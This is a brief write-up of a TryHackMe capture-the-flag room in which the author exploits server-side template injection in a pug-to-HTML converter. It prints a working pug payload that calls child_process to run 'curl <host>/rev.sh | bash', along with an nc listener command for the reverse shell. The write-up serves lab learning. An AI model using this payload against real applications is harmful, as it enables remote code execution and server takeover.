# Write up for the tryhackme ctf: [templates](https://tryhackme.com/room/templates)

```
export ip=10.10.243.24
export hip=10.18.25.169
```

## recon and scanning
## process
- considering this is a pug related ctf, I thought I would directly try the port `5000` and this was open.
- so opening this in a browser
- it shows a pug to html converter which means we can probably execute commands on the server and that means there is a possibility of RCE.
- trying out `title #{1+1}` in the template section and when clicked on convert to html it the rendered html has `2` instead of `1+1`.
- so I tried searching for a reverse shell which we can use in the pug template and came across [this website](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) which had the sample.
  - `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`
- i tried giving the bash reverse shell command directly inside the above line, but it didn't work.
- so I created an `rev.sh` file in this directory and started a python simple http server from here
  - `python -m SimpleHTTPServer 80`
- then in the code which I got from the website for creating the reverseshell, I replaced the ip with my host system's ip.
  - `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.18.25.169/rev.sh | bash')}()}`
- then I started an nc listener on the host
  - `nc -lnvp 4444`
- after that, I clicked on the `convert to html` button and the reverse shell got connected and the flag.txt with the flag was in the current directory of the shell.
